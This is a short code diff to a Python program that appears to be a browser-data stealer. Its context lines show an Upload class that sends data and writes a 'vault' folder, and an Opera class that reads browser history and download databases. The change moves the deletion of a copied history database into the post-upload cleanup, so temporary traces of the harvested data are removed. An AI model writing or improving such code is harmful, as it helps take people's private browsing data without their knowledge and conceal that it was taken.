@@ -34,6 +34,7 @@ class Upload:
         self.send()
         self.clean()
         os.chdir(self.path)
+        os.remove('web_history_db')
     
     def write_files(self):
         os.makedirs("vault", exist_ok=True)
@@ -386,7 +387,6 @@ class Opera:
         cursor.close()
         conn.close()
         os.remove('history_db')
-        os.remove('web_history_db')
 
     def get_downloads(self, path: str) -> None:
         downloads_db = f'{path}\\History'
